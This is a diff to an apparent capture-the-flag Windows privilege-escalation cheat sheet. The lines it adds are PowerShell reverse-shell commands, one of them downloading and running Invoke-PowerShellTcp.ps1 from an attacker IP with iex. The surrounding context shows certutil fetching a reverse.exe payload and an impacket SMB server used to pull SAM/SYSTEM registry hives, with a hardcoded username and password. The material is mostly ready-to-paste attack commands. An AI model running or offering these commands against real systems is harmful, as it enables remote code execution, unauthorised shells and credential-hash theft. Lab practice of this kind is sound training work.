@@ -10,9 +10,15 @@ sudo python3 -m http.server 80
 # go to the windows box
 certutil -urlcache -f http://10.18.112.115/reverse.exe reverse.exe
 
+# using powershell reverse shell modules
+
+powershell.exe -executionpolicy bypass .\Invoke-PowerShellTcp.ps1 -Reverse -IPAddress 10.18.112.115 -Port 4444
+
+powershell iex (New-Object Net.WebClient).DownloadString('http://10.18.112.115/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.18.112.115 -Port 4444
+
+
 # using python smb server
 sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
-
 
 # Dumping SAM/SYSTEM registry hashes
 sudo python3 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public hives
@@ -176,6 +182,9 @@ net start daclsvc
 # To view a file in windows
 more flagUSP.txt
 dir /b/s flagUSP.txt
+
+# from a powershell command prompt
+Get-ChildItem -Path C:\ -name -recurse user*txt
 
 
 # AlwaysInstallElevated
